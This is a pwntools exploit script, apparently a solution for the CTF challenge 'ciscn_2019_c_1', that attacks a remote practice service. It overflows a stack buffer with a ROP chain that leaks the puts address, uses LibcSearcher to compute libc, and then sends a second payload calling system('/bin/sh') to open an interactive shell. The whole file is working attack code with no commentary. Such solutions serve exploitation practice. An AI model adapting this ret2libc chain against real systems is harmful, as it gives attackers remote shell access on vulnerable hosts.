from pwn import*
from LibcSearcher import LibcSearcher
def init(file1,file2,x):
    if file2:
        if x:
            return process(file1),ELF(file1),ELF(file2)
        else:
            return remote("node5.buuoj.cn",26682),ELF(file1),ELF(file2)
    else:
        if x:
            return process(file1),ELF(file1)
        else:
            return remote("node5.buuoj.cn",26682),ELF(file1)
p,elf=init("./ciscn_2019_c_1",0,0)

def log(a,b,c):
    if a:
        context.log_level="debug"
    if b:
        context.os='linux'
    if c:
        context.arch='amd64'  
log(1,1,1)

def real(name):
    if name:
        plt=elf.plt[name]
        got=elf.got[name]
        return plt,got
plt,got=real("puts")

def symbols(name):
    sym=elf.symbols[name]
    return sym
sym = symbols("main")

r = lambda x: p.recv(x)
ru = lambda str: p.recvuntil(str)
rul1 =lambda : u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
rul2 = lambda : u64(p.recvuntil('\n')[:-1].ljust(8,b'\x00'))
s = lambda str: p.send(str)
sl = lambda str: p.sendline(str)
sa = lambda a,b: p.sendafter(a,b)
sla = lambda a,b: p.sendlineafter(a,b)
libc_base = lambda addr,name:addr-libc.dump(name)
go = lambda : p.interactive()

rdi=0x0000000000400c83 
ret=0x00000000004006b9

ru("Input your choice!")
sl(b"1")
ru(b"Input your Plaintext to be encrypted")
sl(b"\0"+cyclic(0x50+7)+p64(rdi)+p64(got)+p64(plt)+p64(ret)+p64(sym))

p.recvuntil(b"Ciphertext\n")
p.recvuntil(b"\n")

via=rul2()
print(hex(via))
libc=LibcSearcher("puts",via)
libc_base=libc_base(via,"puts")

system=libc_base+libc.dump("system")
binsh=libc_base+libc.dump("str_bin_sh")


ru("Input your choice!")
sl(b"1")
ru("Input your Plaintext to be encrypted")

s(cyclic(0x50)+p64(ret)+p64(rdi)+p64(binsh)+p64(system))

go()



    

    
    